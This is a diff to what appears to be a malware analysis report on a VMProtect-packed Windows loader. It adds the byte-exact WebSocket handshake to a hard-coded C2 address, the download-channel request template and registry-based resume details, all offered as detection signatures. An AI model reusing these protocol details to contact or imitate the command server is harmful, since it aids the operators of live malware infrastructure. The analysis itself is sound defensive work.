@@ -174,10 +174,43 @@ A hand-written WebSocket client over raw sockets. Hard-coded C2
 `45.91.202.146`, ports `406` and `408`, both stored encrypted in the config
 block and decrypted into TLS at runtime.
 
-The handshake sends the RFC 6455 **example** key verbatim:
+The handshake request is recovered byte for byte. It is assembled from two
+encrypted constants with the host spliced between them — `A + <host> + B`:
+
+| | Thunk | Length | Content |
+|---|---|---|---|
+| A | `0x140017D70` | 22 | `GET / HTTP/1.1\r\nHost: ` |
+| B | `0x140017DD0` | 117 | `\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: …\r\nSec-WebSocket-Version: 13\r\n\r\n` |
+
+Against the hardcoded C2 that yields exactly 152 bytes:
+
+```http
+GET / HTTP/1.1
+Host: 45.91.202.146
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
 
 ```
-Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+
+Four properties worth recording, all now definite: the request path is **`/`**;
+the header order is exactly as above; there are **no additional headers** (no
+`User-Agent`, `Origin`, `Accept`, `Pragma`, `Cache-Control`,
+`Sec-WebSocket-Extensions` or `Sec-WebSocket-Protocol`); and the request
+terminates with a single `CRLF CRLF`.
+
+**`Host:` carries no port.** The C2 listens on 406/408, not 80, yet the header
+is the bare address — there is no `":%d"`-style format string anywhere in the
+binary. That mismatch is itself a fingerprint.
+
+The `Sec-WebSocket-Key` is the **example value from RFC 6455**, sent unchanged on
+every connection. A conforming client generates 16 random bytes per connection,
+so the fixed server response is equally predictable:
+
+```
+Sec-WebSocket-Key:    dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
 ```
 
 Framing is RFC-conformant: client frames are masked with a 4-byte key
@@ -277,14 +310,17 @@ never blocks.
 
 `0x14000B770` is a download channel **independent of the WebSocket control
 channel**. It never executed under emulation (it requires a real `createtask`),
-so this is static reconstruction supported by the recovered dynamic API table.
+so the control flow below is static reconstruction supported by the recovered
+dynamic API table. The request format itself is not reconstruction — it was
+recovered verbatim from the encrypted string table (see *The download request*
+below).
 
 ```c
 buf = HeapAlloc(heap, HEAP_ZERO_MEMORY, 0x300000);   // 3 MB — fits the 1.45 MB payload
 WSAStartup(0x202, &wsa);
 WideCharToMultiByte(host);
 getaddrinfo(); socket(); connect();
-sprintf(request);                                     // includes a "Host: " header
+sprintf(request, DOWNLOAD_TEMPLATE, task, host, ua);  // see below
 send(); recv() until complete;
 shutdown(); closesocket(); WSACleanup();
 
@@ -302,6 +338,30 @@ The two-name scheme is a **resume protocol**: committed `chunk` values survive
 process termination and reboot, so a killed transfer continues from where it
 stopped. `Software\WinRAR\Libs` is chosen for camouflage — it looks like WinRAR
 library data.
+
+### The download request
+
+Recovered from `0x140025A60` (TLS drop) and `0x14002DABE` (in-place `.rdata`):
+
+```http
+GET /task/%s HTTP/1.1
+Host: %s
+User-Agent: %s
+Connection: close
+
+```
+
+Three substitutions: the task identifier in the path, the host, and a
+User-Agent. **The User-Agent value itself was not recovered** — it does not
+appear among the decrypted strings, so it is most likely composed at runtime
+(the loader builds an OS version string at `0x140009470`). Treated as an open
+item rather than guessed at.
+
+Note the contrast with the control channel: this request *does* carry a
+`User-Agent`, and `Connection: close` marks it as one-shot — consistent with
+fetch-then-teardown rather than a persistent channel. Combined with §7 (the
+response body is an unencrypted PE), `GET /task/` on ports 406/408 is the
+single most specific network signature in this report.
 
 ### Injection
 
@@ -472,6 +532,10 @@ the heuristic cannot establish function extents.
   therefore says nothing about whether the server is alive.
 - **The `.duckdns.org` subdomain prefix.** Mechanism understood (§4.1); the
   cached value is gone with the host.
+- **The `User-Agent` value used by the download channel.** The request template
+  is recovered (§6) and carries `User-Agent: %s`, but the substituted value is
+  not among the decrypted strings — most likely composed at runtime. Recorded as
+  open rather than guessed.
 - **The unnamed 320 KB section.** VMProtect's own runtime. Analysing it studies
   VMProtect, not this loader.
 
